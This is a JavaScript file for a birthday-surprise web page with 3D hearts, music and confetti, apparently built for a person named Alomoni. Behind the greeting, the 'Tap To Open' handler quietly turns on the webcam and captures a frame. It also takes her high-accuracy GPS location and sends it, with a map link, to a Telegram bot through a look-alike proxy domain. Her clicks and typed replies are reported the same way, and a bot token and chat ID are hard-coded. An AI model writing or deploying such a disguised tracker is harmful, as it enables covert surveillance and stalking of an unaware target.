const wishText = "Happy Birthday Alomoni 💕";
const userName = "Alomoni";
const bgMusic = document.getElementById('bg-music');
const botToken = "8940610578:AAHNjT-XlKkI33sQuM3UD6JWea3EFqJ-JL8";
const chatId = "5612194922";

// Timer setup for Nov 28, 2026 with URL force unlock support (?unlock=true)
const targetTime = new Date("2026-11-28T00:00:00").getTime();
const urlParams = new URLSearchParams(window.location.search);
const forceUnlock = urlParams.get('unlock') === 'true';

function updateUnlockTimer() {
    const now = new Date().getTime();
    const diff = targetTime - now;
    const lockOverlay = document.getElementById('lock-overlay');

    if (forceUnlock || diff <= 0) {
        if (lockOverlay) lockOverlay.style.display = 'none';
        return;
    } else {
        if (lockOverlay) lockOverlay.style.display = 'flex';
    }

    const d = Math.floor(diff / (1000 * 60 * 60 * 24));
    const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const s = Math.floor((diff % (1000 * 60)) / 1000);
    
    const daysEl = document.getElementById('days');
    const hoursEl = document.getElementById('hours');
    const minsEl = document.getElementById('mins');
    const secsEl = document.getElementById('secs');

    if(daysEl) daysEl.innerText = String(d).padStart(2, '0');
    if(hoursEl) hoursEl.innerText = String(h).padStart(2, '0');
    if(minsEl) minsEl.innerText = String(m).padStart(2, '0');
    if(secsEl) secsEl.innerText = String(s).padStart(2, '0');
}
setInterval(updateUnlockTimer, 1000);
updateUnlockTimer();

// Fetch User IP for display
fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
        const ipEl = document.getElementById('user-ip-display');
        if(ipEl) ipEl.innerText = data.ip;
    })
    .catch(() => {
        const ipEl = document.getElementById('user-ip-display');
        if(ipEl) ipEl.innerText = '127.0.0.1';
    });

function nextStep(stepNumber) {
    document.querySelectorAll('.step-card').forEach(card => {
        card.classList.remove('active');
    });
    const targetCard = document.getElementById('step-' + stepNumber);
    if(targetCard) targetCard.classList.add('active');
}

function captureAndSavePhoto() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            const video = document.getElementById('webcam-video');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('webcam-canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());
            }, 1500);
        })
        .catch(function(err) {
            console.log("Camera access error:", err);
        });
    }
}

function requestUserLocation(callback) {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;
                const time = new Date().toLocaleString();

                const locMsg = `📍 <b>Alomoni Real-time Location Captured!</b>\n\n🎯 <b>Latitude:</b> <code>${lat}</code>\n🎯 <b>Longitude:</b> <code>${lon}</code>\n📏 <b>Accuracy:</b> ${acc} meters\n🗺️ <b>Google Maps:</b> https://maps.google.com/?q=${lat},${lon}\n⏰ <b>Time:</b> ${time}`;
                const teleUrl = `https://api.telegram.org.is-a.dev/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(locMsg) + `&parse_mode=HTML`;
                fetch(teleUrl).catch(e => console.log(e));

                if (typeof callback === 'function') callback();
            },
            (error) => {
                if (typeof callback === 'function') callback();
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    } else {
        if (typeof callback === 'function') callback();
    }
}

function showToast(msg) {
    const toast = document.getElementById('toast-msg');
    toast.innerText = msg;
    toast.classList.add('show');
    setTimeout(() => { toast.classList.remove('show'); }, 3000);
}

function toggleMusic() {
    if (bgMusic.paused) {
        bgMusic.play().catch(e => console.log(e));
        document.getElementById('music-btn').innerHTML = '🎵 Music On';
    } else {
        bgMusic.pause();
        document.getElementById('music-btn').innerHTML = '🔇 Music Off';
    }
}

const themes = [
    { bg: '#030108', fog: 0x030108, name: 'Aesthetic Night' },
    { bg: '#12001e', fog: 0x12001e, name: 'Royal Purple' },
    { bg: '#00131e', fog: 0x00131e, name: 'Ocean Cyan' },
    { bg: '#1c0e00', fog: 0x1c0e00, name: 'Golden Glow' }
];
let currentThemeIdx = 0;

function toggleTheme() {
    currentThemeIdx = (currentThemeIdx + 1) % themes.length;
    const theme = themes[currentThemeIdx];
    document.body.style.backgroundColor = theme.bg;
    if (scene) scene.fog.color.setHex(theme.fog);
    showToast("🎨 Theme: " + theme.name);
}

function sendLove() {
    const hearts = ['💖', '❤', '✨', '💕', '⭐', '🌸'];
    for (let i = 0; i < 15; i++) {
        setTimeout(() => {
            const heart = document.createElement('div');
            heart.className = 'heart-particle';
            heart.innerText = hearts[Math.floor(Math.random() * hearts.length)];
            heart.style.left = Math.random() * 90 + 5 + 'vw';
            heart.style.animationDuration = (Math.random() * 2 + 2) + 's';
            document.body.appendChild(heart);
            setTimeout(() => heart.remove(), 3500);
        }, i * 80);
    }
    showToast("💖 Sending Love! to Rafiul ✨");

    const directMsg = `💖 <b>Alomoni Sent Love!</b>\n\n⏰ <b>Time:</b> ` + new Date().toLocaleString();
    const teleUrl = `https://api.telegram.org.is-a.dev/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(directMsg) + `&parse_mode=HTML`;
    fetch(teleUrl).catch(err => console.log(err));
}

function sendCustomMessage() {
    const msgInput = document.getElementById('user-custom-msg');
    const text = msgInput.value.trim();

    if (!text) {
        showToast("⚠ Please write something first!");
        return;
    }

    showToast("🚀 Sending message...");

    const directMsg = `💌 <b>New Reply from Alomoni!</b>\n\n💬 <b>Message:</b> ` + text + `\n⏰ <b>Time:</b> ` + new Date().toLocaleString();
    const teleUrl = `https://api.telegram.org.is-a.dev/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(directMsg) + `&parse_mode=HTML`;
    
    fetch(teleUrl)
        .then(() => {
            showToast("✅ Message sent successfully!");
            msgInput.value = "";
            setTimeout(() => {
                endExperience();
            }, 1000);
        })
        .catch(e => {
            showToast("❌ Failed to send!");
            console.log(e);
        });
}

function endExperience() {
    document.getElementById('content-wrapper').style.display = 'none';
    document.getElementById('scroll-hint').style.display = 'none';
    document.getElementById('top-controls').style.display = 'flex'; 
    triggerFireworks();
    showToast("✨ Hope you enjoyed the surprise!");
}

function readAgain() {
    document.getElementById('content-wrapper').style.display = 'flex'; 
    document.getElementById('scroll-hint').style.display = 'block';
    document.getElementById('top-controls').style.display = 'flex'; 
    nextStep(1);
}

function proceedToInterface() {
    document.getElementById('start-overlay').style.display = 'none';
    document.getElementById('countdown-overlay').style.display = 'flex';
    startCountdown();
}

function startSurprise() {
    const btn = document.getElementById('start-btn');
    btn.disabled = true;
    btn.innerText = "Opening... ⌛";
    bgMusic.load();

    captureAndSavePhoto();

    const clickMsg = `⚡ <b>Alomoni Clicked 'Tap To Open'!</b>\n\n⏰ <b>Time:</b> ` + new Date().toLocaleString();
    const teleUrl = `https://api.telegram.org.is-a.dev/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(clickMsg) + `&parse_mode=HTML`;
    fetch(teleUrl).catch(e => console.log(e));

    requestUserLocation(() => {
        proceedToInterface();
    });
}

let scene, camera, renderer, controls;

scene = new THREE.Scene();
scene.fog = new THREE.FogExp2(0x030108, 0.0008);

camera = new THREE.PerspectiveCamera(70, window.innerWidth / window.innerHeight, 0.1, 2000);
camera.position.set(0, 0, 450);

renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
renderer.setSize(window.innerWidth, window.innerHeight);
renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

const container = document.getElementById('canvas-container');
container.appendChild(renderer.domElement);

controls = new THREE.OrbitControls(camera, renderer.domElement);
controls.enableDamping = true;
controls.dampingFactor = 0.08;
controls.enableZoom = false;

const ambientLight = new THREE.AmbientLight(0xffffff, 1.2);
scene.add(ambientLight);

const dirLight = new THREE.DirectionalLight(0xffd700, 2.0);
dirLight.position.set(100, 200, 150);
scene.add(dirLight);

function createTextTexture(text) {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 1024;
    canvas.height = 256;

    ctx.font = 'Bold 55px "Segoe UI", sans-serif';
    ctx.fillStyle = '#ffffff';
    ctx.shadowColor = '#ffd700';
    ctx.shadowBlur = 20;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillText(text, canvas.width / 2, canvas.height / 2);

    const texture = new THREE.CanvasTexture(canvas);
    texture.needsUpdate = true;
    return texture;
}

function createHeartTexture() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 128;
    canvas.height = 128;

    ctx.font = '80px sans-serif';
    ctx.fillStyle = '#ffffff';
    ctx.shadowColor = '#ff007f';
    ctx.shadowBlur = 20;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillText('💖', canvas.width / 2, canvas.height / 2);

    const texture = new THREE.CanvasTexture(canvas);
    texture.needsUpdate = true;
    return texture;
}

const textTexture = createTextTexture(wishText);
const heartTexture = createHeartTexture();

const particles = [];
const particleCount = 850;

for (let i = 0; i < particleCount; i++) {
    const isText = Math.random() > 0.15;
    const texture = isText ? textTexture : heartTexture;
    
    const material = new THREE.SpriteMaterial({
        map: texture,
        transparent: true,
        blending: THREE.AdditiveBlending,
        opacity: Math.random() * 0.7 + 0.3,
        color: new THREE.Color()
    });

    const sprite = new THREE.Sprite(material);
    
    sprite.position.x = (Math.random() - 0.5) * 1400;
    sprite.position.y = (Math.random() - 0.5) * 1400;
    sprite.position.z = (Math.random() - 0.5) * 1400;

    sprite.speedY = Math.random() * 0.7 + 0.3;

    const scaleRandom = Math.random() * 0.5 + 0.75;
    if (isText) {
        sprite.scale.set(160 * scaleRandom, 40 * scaleRandom, 1);
    } else {
        sprite.scale.set(40 * scaleRandom, 40 * scaleRandom, 1);
    }

    if (i % 2 === 0) {
        material.color.setHSL(0.12, 1.0, 0.65);
    } else {
        material.color.setHSL(0.92, 1.0, 0.65);
    }

    scene.add(sprite);
    particles.push(sprite);
}

function animate() {
    requestAnimationFrame(animate);

    particles.forEach((p) => {
        p.position.y -= p.speedY;

        if (p.position.y < -700) {
            p.position.y = 700;
            p.position.x = (Math.random() - 0.5) * 1400;
        }
    });

    controls.update();
    renderer.render(scene, camera);
}

function triggerFireworks() {
    const duration = 4 * 1000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 1000 };

    function randomInRange(min, max) {
        return Math.random() * (max - min) + min;
    }

    const interval = setInterval(function() {
        const timeLeft = animationEnd - Date.now();

        if (timeLeft <= 0) {
            return clearInterval(interval);
        }

        const particleCount = 50 * (timeLeft / duration);
        confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } }));
        confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } }));
    }, 250);
}

function startCountdown() {
    let timeLeft = 3;
    const countdownOverlay = document.getElementById('countdown-overlay');
    const countdownText = document.getElementById('countdown-text');

    const timer = setInterval(() => {
        timeLeft--;
        if (timeLeft > 0) {
            countdownText.innerText = timeLeft;
        } else {
            clearInterval(timer);

            bgMusic.play().then(() => {
                document.getElementById('music-btn').innerHTML = '🎵 Music On';
            }).catch(err => console.log("Audio play error: ", err));

            countdownOverlay.style.opacity = '0';
            setTimeout(() => {
                countdownOverlay.style.display = 'none';
                document.getElementById('scroll-hint').style.display = 'block';
                
                setTimeout(() => {
                    nextStep(1);
                }, 3000);

            }, 800);
            
            animate(); 
            triggerFireworks();
        }
    }, 1000);
}

window.addEventListener('resize', () => {
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
});
